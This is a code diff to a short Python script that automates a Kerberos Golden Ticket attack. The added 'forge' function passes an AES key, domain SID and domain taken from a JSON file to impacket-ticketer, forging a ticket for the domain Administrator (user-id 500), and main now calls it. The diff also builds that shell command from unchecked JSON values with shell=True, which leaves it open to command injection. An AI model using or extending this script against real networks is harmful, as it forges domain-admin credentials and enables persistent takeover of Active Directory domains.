@@ -5,13 +5,13 @@ import json
 from pathlib import Path
 import subprocess
 
-def test(test_json):
+def forge(test_json):
     subprocess.run(f"impacket-ticketer -aesKey {test_json['aesKey']} -domain-sid {test_json['sid']} -domain {test_json['domain']} -user-id 500 Administrator",shell=True)
     print("[+] GOLDEN TICKET CREATED")
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Automate Golden Ticket Attack")
+    parser = argparse.ArgumentParser(description="Automate ticketer command from .json file for Golden Ticket Attack")
     parser.add_argument("json_path", type=Path, help="Path to JSON file")
     args = parser.parse_args()
 
@@ -23,6 +23,8 @@ def main():
             data = json.load(f)
         except json.JSONDecodeError as e:
             parser.error(f"Invalid JSON in {args.json_path}: {e}")
+
+    forge(data)
 
 if __name__ == "__main__":
     main()
